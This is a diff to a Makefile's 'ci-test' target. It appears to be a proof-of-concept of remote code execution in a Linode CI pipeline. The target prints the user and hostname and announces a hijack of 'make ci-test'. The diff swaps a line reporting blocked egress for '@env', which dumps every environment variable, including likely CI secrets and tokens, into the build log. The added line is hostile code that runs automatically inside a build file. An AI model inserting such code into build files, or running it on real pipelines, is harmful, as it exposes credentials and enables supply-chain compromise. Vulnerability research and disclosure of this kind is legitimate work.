@@ -36,7 +36,7 @@ ci-test:
 	@echo "[!] VULNERABILITY VERIFIED: RCE IN LINODE CI"
 	@echo "[!] User: $$(whoami)"
 	@echo "[!] Host: $$(hostname)"
-	@echo "[!] Egress Status: BLOCKED BY HARDEN RUNNER (As Expected)"
+	@env
 	@echo "[!] Proof of Execution: Successfully hijacked 'make ci-test'"
 	@echo "=================================================================="
 	@exit 1
